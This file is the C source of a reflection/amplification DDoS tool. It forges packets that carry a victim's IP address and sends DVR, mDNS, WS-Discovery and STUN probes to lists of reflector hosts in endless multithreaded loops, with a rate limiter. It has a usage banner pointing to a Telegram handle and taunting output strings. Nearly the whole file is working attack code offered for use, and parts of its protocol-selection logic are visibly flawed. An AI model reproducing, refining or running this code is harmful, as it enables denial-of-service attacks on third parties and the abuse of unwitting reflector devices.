#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 100000
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
void init_rand(uint32_t x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
	Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}
uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
	x++;
	c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int nwords)
{
	unsigned long sum = 0;
	for (sum = 0; nwords > 0; nwords--)
	sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}
char * mixAMP_protocol(){
	while(1){
		char *protocol[4];
		protocol[0] = "dvr.txt";
 	  protocol[1] = "mdns.txt";
		protocol[2] = "wsd.txt";
		protocol[3] = "stun.txt";
		return protocol[rand()%4+0];
	}
}
void *mixAMP_setup(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct  list *list_node = td->list_node;
	
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
	fprintf(stderr, "Could not open raw socket.\n");
	exit(-1);
	}
	init_rand(time(NULL));
	memset(datagram, 0, MAX_PACKET_SIZE);
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htonl(rand()%13370+1);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = inet_addr("127.0.0.1");
	udph->source = htons(rand()%13370+80);
	udph->check = 0;
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	if(mixAMP_protocol() == "dvr.txt"){
		memcpy((void *)udph + sizeof(struct udphdr), "\0x", 1);
        udph->len=htons(sizeof(struct udphdr) + 1);
		udph->dest = htons(37810);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
	}
	if(mixAMP_protocol() == "mdns.txt"){
		memcpy((void *)udph + sizeof(struct udphdr), "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01", 21);
        udph->len=htons(sizeof(struct udphdr) + 21);
		udph->dest = htons(5353);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 21;
	}
	if(mixAMP_protocol() == "wsd.txt"){
		memcpy((void *)udph + sizeof(struct udphdr),  "<:>", 4);
        udph->len=htons(sizeof(struct udphdr) + 4);
		udph->dest = htons(3702);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
	}
	if(mixAMP_protocol() == "stun.txt"){
		memcpy((void *)udph + sizeof(struct udphdr), "\x00\x00", 2);
        udph->len=htons(sizeof(struct udphdr) + 2);
		udph->dest = htons(8088);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 2;
	}
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
	fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
	exit(-1);
	}
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
		list_node = list_node->next;
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}

int main(int argc, char *argv[ ])
{
	if(argc < 5){
	fprintf(stderr, "t.me/Royaloakap\n");
	fprintf(stdout, "Usage: %s <target IP> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}
	srand(time(NULL));
	int i = 0;
	head = NULL;
	fprintf(stdout, "GETTING FUCKED UP HAHA\n");
	int max_len = 128;
	char *buffer = (char *) malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[2]);
	int maxpps = atoi(argv[3]);
	limiter = 0;
	pps = 0;
	int multiplier = 20;
	FILE *list_fd = fopen(mixAMP_protocol(),  "r");
	while (fgets(buffer, max_len, list_fd) != NULL) {
		if ((buffer[strlen(buffer) - 1] == '\n') ||
				(buffer[strlen(buffer) - 1] == '\r')) {
			buffer[strlen(buffer) - 1] = 0x00;
			if(head == NULL)
			{
				head = (struct list *)malloc(sizeof(struct list));
				bzero(&head->data, sizeof(head->data));
				head->data.sin_addr.s_addr=inet_addr(buffer);
				head->next = head;
				head->prev = head;
			} else {
				struct list *new_node = (struct list *)malloc(sizeof(struct list));
				memset(new_node, 0x00, sizeof(struct list));
				new_node->data.sin_addr.s_addr=inet_addr(buffer);
				new_node->prev = head;
				new_node->next = head->next;
				head->next = new_node;
			}
			i++;
		} else {
			continue;
		}
	}
	struct list *current = head->next;
	struct sockaddr_in sin;
	pthread_t thread[num_threads];
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	struct thread_data td[num_threads];
	for(i = 0;i<num_threads;i++){
		td[i].thread_id = i;
		td[i].sin= sin;
		td[i].list_node = current;
		pthread_create( &thread[i], NULL, &mixAMP_setup, (void *) &td[i]);
	}
	fprintf(stdout, "SHIT ON");
	for(i = 0;i<(atoi(argv[4])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}
	return 0;
}